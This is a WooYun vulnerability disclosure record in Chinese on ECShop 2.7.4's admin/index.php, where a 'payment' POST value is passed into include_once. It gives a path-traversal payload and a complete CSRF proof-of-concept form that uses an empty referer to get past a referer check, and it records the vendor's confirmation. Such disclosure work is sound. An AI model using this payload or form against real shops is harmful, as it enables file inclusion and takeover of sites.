{"id": 51047, "wybug_id": "wooyun-2014-075915", "wybug_title": "ecshop最新版后台文件包含+csrf利用", "wybug_corp": "ShopEx", "wybug_author": "D＆G", "wybug_date": "2014-09-16 11:58", "wybug_open_date": "2014-12-15 12:00", "wybug_type": "任意文件遍历/下载", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件包含"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-15：\t细节向公众公开  简要描述： 文件包含，需要截断 详细说明：  看到这个漏洞给中危了还就看了下。 WooYun: ECSHOP跨站+后台文件包含=Getshell 只测试了2.7.3一个版本和最新的2.7.4 beta1代码：admin/index.php 644行\nelseif ($_REQUEST['act'] == 'second'){admin_priv('shop_config');$shop_name = empty($_POST['shop_name']) ? '' : $_POST['shop_name'] ;$shop_title = empty($_POST['shop_title']) ? '' : $_POST['shop_title'] ;$shop_country = empty($_POST['shop_country']) ? '' : intval($_POST['shop_country']);$shop_province = empty($_POST['shop_province']) ? '' : intval($_POST['shop_province']);$shop_city = empty($_POST['shop_city']) ? '' : intval($_POST['shop_city']);$shop_address = empty($_POST['shop_address']) ? '' : $_POST['shop_address'] ;$shipping = empty($_POST['shipping']) ? '' : $_POST['shipping'];$payment = empty($_POST['payment']) ? '' : $_POST['payment'];省略。。。。payment变量直接从post去得。到770行if(!empty($payment)){/* 取相应插件信息 */$set_modules = true;include_once(ROOT_PATH.'includes/modules/payment/' . $payment . '.php');\n直接拼接到了include_once中，因为这里利用需要截断，要根据不同的环境处理。这里采用自己根目录写一个文件phpinfo.php文件进行包含测试。post地址：/ecshop2.7.4/admin/index.php?act=secondpost参数：area_name=wbjewbvk&payment=../../../phpinf&shipping=city_express&shipping_city=San%20Francisco&shipping_country=1&shipping_district=1&shipping_province=2&shop_address=3137%20Laguna%20Street&shop_city=52&shop_country=1&shop_name=ECSHOP&shop_province=2&shop_title=ECSHOP%e6%bc%94%e7%a4%ba%e7%ab%99payment参数存在问题。\n\n可以结合csrf利用。csrf导致文件包含getshell。写文件的思路就不赘述了。这里测试发现ecshop是对csrf有一定防御的。判断了referer，可惜利用空referer可以绕过。构造空referer参考http://zone.wooyun.org/content/744这里只给一个手动测试的demo。\n<html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action=\"http://127.0.0.1/ecshop2.7.4/admin/index.php?act=second\" method=\"POST\"><input type=\"hidden\" name=\"area_name\" value=\"wbjewbvk\" /><input type=\"hidden\" name=\"payment\" value=\"../../../phpinf\" /><input type=\"hidden\" name=\"shipping\" value=\"city_express\" /><input type=\"hidden\" name=\"shipping_city\" value=\"San Francisco\" /><input type=\"hidden\" name=\"shipping_country\" value=\"1\" /><input type=\"hidden\" name=\"shipping_district\" value=\"1\" /><input type=\"hidden\" name=\"shipping_province\" value=\"2\" /><input type=\"hidden\" name=\"shop_address\" value=\"3137 Laguna Street\" /><input type=\"hidden\" name=\"shop_city\" value=\"52\" /><input type=\"hidden\" name=\"shop_country\" value=\"1\" /><input type=\"hidden\" name=\"shop_name\" value=\"ECSHOP\" /><input type=\"hidden\" name=\"shop_province\" value=\"2\" /><input type=\"hidden\" name=\"shop_title\" value=\"ECSHOP%e6%bc%94%e7%a4%ba%e7%ab%99\" /><input type=\"submit\" value=\"Submit request\" /></form></body></html>\n\n\n   漏洞证明：  \n\n   修复方案：  弱弱问一句，之前的后台漏洞都修复了么   版权声明：转载请注明来源 D＆G@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-09-16 13:41 厂商回复： 非常感谢您为shopex信息安全做的贡献我们将尽快修复非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}